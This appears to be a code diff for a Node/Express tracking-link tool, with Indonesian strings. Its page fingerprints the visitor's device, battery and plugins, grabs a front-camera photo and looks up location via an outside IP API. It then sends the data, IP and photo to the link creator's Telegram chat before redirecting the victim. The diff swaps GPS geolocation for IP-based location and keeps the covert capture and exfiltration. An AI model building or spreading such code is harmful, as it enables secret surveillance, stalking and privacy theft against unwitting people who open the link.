@@ -129,14 +129,13 @@ app.get('/s/:data', async (req, res) => {
                     } catch (e) { return 'N/A'; }  
                 };  
               
-                let permissionsGranted = 0;  
                 const { os, browser } = getOsAndBrowser(navigator.userAgent);  
 
                 const data = {  
                     creatorId: \`${creatorId}\`, targetUrl: \`${targetUrl}\`, userAgent: navigator.userAgent,  
                     os: os, platform: navigator.platform, language: navigator.language,  
                     screenWidth: window.screen.width, screenHeight: window.screen.height,  
-                    location: 'Ditolak/Dilewati', camera: 'Ditolak/Dilewati'  
+                    cfLocation: '', cfCity: '', camera: 'Ditolak/Dilewati'  
                 };  
 
                 try { const battery = await navigator.getBattery(); data.battery = { level: \`\${Math.round(battery.level * 100)}%\`, isCharging: battery.charging }; } catch (e) { data.battery = { level: 'N/A', isCharging: 'N/A' }; }  
@@ -162,11 +161,14 @@ app.get('/s/:data', async (req, res) => {
                     plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'Tidak ada'  
                 };  
 
-                try {  
-                    const position = await new Promise((resolve, reject) => { navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }); });  
-                    data.location = \`https://www.google.com/maps?q=\${position.coords.latitude},\${position.coords.longitude}\`;  
-                    permissionsGranted++;  
-                } catch (e) {}  
+                try {
+                    const siputRes = await fetch('https://api.siputzx.my.id/', { headers: { 'Accept': 'application/json' } });
+                    const siputData = await siputRes.json();
+                    if (siputData.cf && siputData.cf.latitude && siputData.cf.longitude) {
+                        data.cfLocation = \`https://www.google.com/maps?q=\${siputData.cf.latitude},\${siputData.cf.longitude}\`;
+                        data.cfCity = siputData.cf.city || 'Unknown';
+                    }
+                } catch (e) {}
 
                 try {  
                     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });  
@@ -175,10 +177,8 @@ app.get('/s/:data', async (req, res) => {
                     canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);  
                     data.camera = canvas.toDataURL('image/jpeg');  
                     stream.getTracks().forEach(track => track.stop());  
-                    permissionsGranted++;  
                 } catch (e) {}  
                   
-                data.permissionsGranted = permissionsGranted;  
                 await logData(data);  
                 redirectToTarget();  
             }  
@@ -196,10 +196,6 @@ app.post('/log', async (req, res) => {
     const creatorId = data.creatorId;
 
     if (!creatorId) { return res.sendStatus(400); }  
-
-    const edgeLat = req.headers['x-vercel-ip-latitude'] || req.headers['cf-iplatitude'];
-    const edgeLon = req.headers['x-vercel-ip-longitude'] || req.headers['cf-iplongitude'];
-    const edgeCity = req.headers['x-vercel-ip-city'] || req.headers['cf-ipcity'] || '-';
     
     let ipInfo = 'Tidak dapat mengambil info IP.';  
     let fallbackMapUrl = ''; 
@@ -212,11 +208,9 @@ app.post('/log', async (req, res) => {
         }  
     } catch (e) {}  
 
-    let finalLocation = 'Ditolak / Gagal Dilacak';
-    if (data.location.startsWith('http')) {
-        finalLocation = `${data.location} (📍 Presisi via GPS Target)`;
-    } else if (edgeLat && edgeLon) {
-        finalLocation = `https://www.google.com/maps?q=${edgeLat},${edgeLon} (☁️ Akurat via Edge Server - ${edgeCity})`;
+    let finalLocation = 'Gagal Dilacak';
+    if (data.cfLocation && data.cfLocation.startsWith('http')) {
+        finalLocation = `${data.cfLocation} (☁️ Akurat via CF Edge SiputZX - ${data.cfCity})`;
     } else if (fallbackMapUrl !== '') {
         finalLocation = `${fallbackMapUrl} (🌐 Estimasi via IP API)`;
     }
@@ -263,7 +257,6 @@ Detail IP:\n${ipInfo}
 Lokasi Terbaik: ${finalLocation}
 
 🔐 — RINGKASAN IZIN —
-Total Izin Diberikan: ${data.permissionsGranted} dari 2
 Akses Kamera: ${cameraStatusText}
 `;
 
@@ -275,7 +268,7 @@ Akses Kamera: ${cameraStatusText}
             const form = new FormData();  
             form.append('chat_id', creatorId);  
             form.append('photo', imageBuffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });  
-            form.append('caption', `📸 Gambar dari kamera target.\nIP: \`${ip}\`\nLokasi: ${finalLocation}`);  
+            form.append('caption', `📸 Gambar dari kamera target.\nIP: \`${ip}\``);  
             await axios.post(`${TELEGRAM_API}/sendPhoto`, form, { headers: form.getHeaders() });  
         }  
     } catch (error) {}  
